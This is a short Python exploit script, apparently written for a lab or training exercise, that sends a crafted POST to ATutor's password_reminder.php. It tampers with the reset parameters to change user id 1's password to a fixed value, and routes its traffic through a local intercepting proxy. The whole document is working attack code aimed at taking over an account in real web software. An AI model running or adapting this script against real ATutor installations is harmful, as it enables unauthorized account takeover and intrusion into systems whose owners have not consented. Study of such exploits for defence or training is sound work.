import sys, re, os, html
import requests
from bs4 import BeautifulSoup

from time import sleep
import hashlib, string, itertools
from io import BytesIO
import zipfile


def reset_password(ip):
    print("Resetting Password.....")
    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)
    proxies = {
        'http': 'http://127.0.0.1:8080'
    }
    s.proxies.update(proxies)
    
    target = f'http://{ip}/ATutor/password_reminder.php'
    PASSWORD = 'Bromine6!'
    password_hash = hashlib.sha1(PASSWORD.encode()).hexdigest()

    data = {
        'form_change': 'true',
        'id': 1,
        'g': 2,
        'h': 4, 
        'password': PASSWORD,
        'password2': PASSWORD,
        'form_password_hidden': password_hash,
        'password_error': '',
        'submit': 'Submit'
    }

    r = s.post(target, data=data)
    print(r.text)

if __name__ == '__main__':
    reset_password('atutor')

